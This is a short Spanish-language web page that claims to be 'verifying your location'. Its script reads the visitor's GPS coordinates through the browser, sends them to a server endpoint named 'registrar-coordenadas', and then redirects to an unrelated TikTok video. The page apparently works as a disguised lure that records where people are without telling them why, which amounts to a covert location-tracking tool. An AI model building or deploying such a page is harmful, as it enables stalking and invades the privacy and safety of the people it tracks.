<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificar Ubicación</title>
</head>
<body>
  <h1>Verificando tu ubicación...</h1>

  <script>
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          console.log("Ubicación obtenida:", lat, lon);

          // Enviar las coordenadas al endpoint en Vercel
          try {
            const response = await fetch("/api/registrar-coordenadas", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ lat, lon }),
            });

            const data = await response.json();
            console.log("Respuesta del servidor:", data);

            // Redirigir al usuario al enlace de TikTok
            window.location.href = "https://www.tiktok.com/@nuevaera2010/video/7091080509635284229";
          } catch (error) {
            console.error("Error al enviar coordenadas:", error);
          }
        },
        (error) => {
          console.error("Error al obtener ubicación:", error.message);
          alert("No se pudo obtener tu ubicación. Por favor permite el acceso.");
        }
      );
    } else {
      alert("Tu navegador no soporta geolocalización.");
    }
  </script>
</body>
</html>
